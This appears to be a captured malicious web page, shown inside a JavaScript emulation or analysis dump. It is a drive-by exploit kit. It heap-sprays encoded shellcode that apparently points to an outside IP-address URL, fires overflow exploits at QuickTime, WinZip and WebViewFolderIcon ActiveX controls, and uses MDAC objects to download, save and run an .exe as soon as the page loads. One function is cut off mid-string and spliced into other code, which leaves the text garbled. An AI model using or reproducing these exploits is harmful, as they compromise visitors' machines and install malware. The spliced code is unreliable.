navigator.appCodeName = String("Mozilla"); navigator.appVersion = String("5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"); navigator.userAgent = String("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"); document.lastModified = String("");
var location = new emu_location("ftpcom","ftpcom"); 

//document.write (s)

 
</textarea><html>
<head>
<title></title>
<script language="JavaScript">

var memory = new Array();
var mem_flag = 0;

function having() { memory=memory; setTimeout("having()", 2000); }

function getSpraySlide(spraySlide, spraySlideSize)
{
	while (spraySlide.length*2<spraySlideSize)
	{spraySlide += spraySlide;}

	spraySlide = spraySlide.substring(0,spraySlideSize/2);
	return spraySlide;
}

function makeSlide()
{
	var heapSprayToAddress = 0x0c0c0c0c;
	var payLoadCode = unescape("%u4343%u4343%u0feb%u335b%u66c9%u80b9%u8001%uef33" +
"%ue243%uebfa%ue805%uffec%uffff%u8b7f%udf4e%uefef%u64ef%ue3af%u9f64%u42f3%u9f64%u6ee7%uef03%uefeb" +
"%u64ef%ub903%u6187%ue1a1%u0703%uef11%uefef%uaa66%ub9eb%u7787%u6511%u07e1%uef1f%uefef%uaa66%ub9e7" +
"%uca87%u105f%u072d%uef0d%uefef%uaa66%ub9e3%u0087%u0f21%u078f%uef3b%uefef%uaa66%ub9ff%u2e87%u0a96" +
"%u0757%uef29%uefef%uaa66%uaffb%ud76f%u9a2c%u6615%uf7aa%ue806%uefee%ub1ef%u9a66%u64cb%uebaa%uee85" +
"%u64b6%uf7ba%u07b9%uef64%uefef%u87bf%uf5d9%u9fc0%u7807%uefef%u66ef%uf3aa%u2a64%u2f6c%u66bf%ucfaa" +
"%u1087%uefef%ubfef%uaa64%u85fb%ub6ed%uba64%u07f7%uef8e%uefef%uaaec%u28cf%ub3ef%uc191%u288a%uebaf" +
"%u8a97%uefef%u9a10%u64cf%ue3aa%uee85%u64b6%uf7ba%uaf07%uefef%u85ef%ub7e8%uaaec%udccb%ubc34%u10bc" +
"%ucf9a%ubcbf%uaa64%u85f3%ub6ea%uba64%u07f7%uefcc%uefef%uef85%u9a10%u64cf%ue7aa%ued85%u64b6%uf7ba" +
"%uff07%uefef%u85ef%u6410%uffaa%uee85%u64b6%uf7ba%uef07%uefef%uaeef%ubdb4%u0eec%u0eec%u0eec%u0eec" +
"%u036c%ub5eb%u64bc%u0d35%ubd18%u0f10%u64ba%u6403%ue792%ub264%ub9e3%u9c64%u64d3%uf19b%uec97%ub91c" +
"%u9964%ueccf%udc1c%ua626%u42ae%u2cec%udcb9%ue019%uff51%u1dd5%ue79b%u212e%uece2%uaf1d%u1e04%u11d4" +
"%u9ab1%ub50a%u0464%ub564%ueccb%u8932%ue364%u64a4%uf3b5%u32ec%ueb64%uec64%ub12a%u2db2%uefe7%u1b07" +
"%u1011%uba10%ua3bd%ua0a2%uefa1%u7468%u7074%u2F3A%u362F%u2E34%u3833%u332E%u2E33%u3331%u7E2F%u7466%u6370%u6D6F%u2F2F%u6966%u656C%u702E%u7068");
	var heapBlockSize = 0x400000;
	var payLoadSize = payLoadCode.length * 2;
	var spraySlideSize = heapBlockSize - (payLoadSize+0x38);
	var spraySlide = unescape("%u0c0c%u0c0c");

	spraySlide = getSpraySlide(spraySlide,spraySlideSize);
	heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;
	
	for (i=0;i<heapBlocks;i++)
	{
		memory[i] = spraySlide + payLoadCode;
	}

	mem_flag = 1;
	having();
	return memory;
}

function startWVF()
{
	for (i=0;i<128;i++)
	{
		try{ 
			var tar = new ActiveXObject('WebVi'+'ewFol'+'derIc'+'on.WebVi'+'ewFol'+'derI'+'con.1');
			d = 0x7ffffffe;
			b = 0x0c0c0c0c
			tar.setSlice(d, b, b, b ); 
		}catch(e){}
	}
}

function startWinZip(object)
{
	var xh = 'A';
	while (xh.length < 231) xh+='A';
	xh+="\x0c\x0c\x0c\x0c\x0c\x0c\x0c";
	object.CreateNewFolderFromName(xh);
}

function startOverflow(num)
{
	if (num == 0) {
		try {
			var qt = new ActiveXObject('QuickTime.QuickTime');		
			if (qt) {
				var qthtml = '<object CLASSID="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" width="1" height="1" style="border:0px">'+
				'<param name="src" value="qt.php">'+
				'<param name="autoplay" value="true">'+
				'<param name="loop" value="false">'+
				'<param name="controller" value="true">'+
				'</object>';
				if (! mem_flag) makeSlide();
				document.getElementById('mydiv').innerHTML = qthtml;
				num = 255;
			}
		} catch(e) { }

		if (num = 255) setTimeout("startOverflow(1)", 2000);
		else startOverflow(1);

	} else if (num == 1) {
		try {
			var winzip = document.createElement("object");
			winzip.setAttribute("classid", "clsid:A09AE68F-B14D-43ED-B713-BA413F034904");

			var ret=winzip.CreateNewFolderFromName(unescape("%00"));
			if (ret == false) {
				if (! mem_flag) makeSlide();
				startWinZip(winzip);
				num = 255;
			}

		} catch(e) { }

		if (num = 255) setTimeout("startOverflow(2)", 2000);
		else startOverflow(2);

	} else if (num == 2) {

		try {
			var tar = new ActiveXObject('WebVi'+'ewFol'+'derIc'+'on.WebVi'+'ewFol'+'derI'+'con.1');
			if (tar) {
				if (! mem_flag) makeSlide();
				startWVF();
			}
		} catch(e) { }
	}
}


function GetRandString(len)
{
	var chars = "abcdefghiklmnopqrstuvwxyz";
	var string_length = len;
	var randomstring = '';
	for (var i=0; i<string_length; i++) {
		var rnum = Math.floor(Math.random() * chars.length);
		randomstring += chars.substring(rnum,rnum+1);
	}

	return randomstring;
}

function CreateObject(CLSID, name) {
	var r = null;
	try { eval('r = CLSID.CreateObject(name)') }catch(e){}	
	if (! r) { try { eval('r = CLSID.CreateObject(name, "")') }catch(e){} }
	if (! r) { try { eval('r = CLSID.CreateObject(name, "", "")') }catch(e){} }
	if (! r) { try { eval('r = CLSID.GetObject("", name)') }catch(e){} }
	if (! r) { try { eval('r = CLSID.GetObject(name, "")') }catch(e){} }
	if (! r) { try { eval('r = CLSID.GetObject(name)') }catch(e){} }
	return(r);
}

function XMLHttpDownload(xml, url) {

	try {
		xml.open("GET", url, false);
		xml.send(null);

	} catch(e) { return 0; }

	return xml.responseBody;
}

function ADOBDStreamSave(o, name, data) {

	try {
		o.Type = 1;
		o.Mode = 3;
		o.Open();
		o.Write(data);
		o.SaveToFile(name, 2);
		o.Close();
	} catch(e) { return 0; }

	return 1;
}

function ShellExecute(exec, name, type) {

	if (type == 0) {
		try { exec.Run(name, 0); return 1; } catch(e) { }
	} else {
		try { exe.ShellExecute(name); return 1; } catch(e) { }
	}

	return(0);

}

function MDAC() {
	var t = new Array('{BD96C556-65A3-11D0-983A-00C04FC29E30}', '{BD96C556-65A3-11D0-983A-00C04FC29E36}', '{AB9BCEDD-EC7E-47E1-9322-D4A210617116}', '{0006F033-0000-0000-C000-000000000046}', '{0006F03A-0000-0000-C000-000000000046}', '{6e32070a-766d-4ee6-879c-dc1fa91d2fc3}', '{6414512B-B978-451D-A0D8-FCFDF33E833C}', '{7F5B7F63-F06F-43sDownload(v[0], urlRealExe);
		if (data != 0) {
			var name = "c:\\sys"+GetRandString(4)+".exe";
			if (ADOBDStreamSave(v[1], name, data) == 1) {
				if (ShellExecute(v[2], name, n) == 1) {
					ret=1;
				}
			}
		}
	}

	return ret;
}

function start() {

	if (! MDAC() ) { startOverflow(0); }

}

</script>
</head>
<body onload="start()">
<div id="mydiv"></div>
</body>
</html>

intervalExec = 
name = WebLink
path = /C/Program Files/Adobe Reader 8.0/Reader/plug_ins/weblink.api
Rcheck = ebb8c4cb4d19c9286ef48de68c0ba585
//final variable enumeration
//var intervalExec
//var name
//var path
//var Rcheck

var Rcheck = '7928af015f27d5fc21c1577035d9ff68';
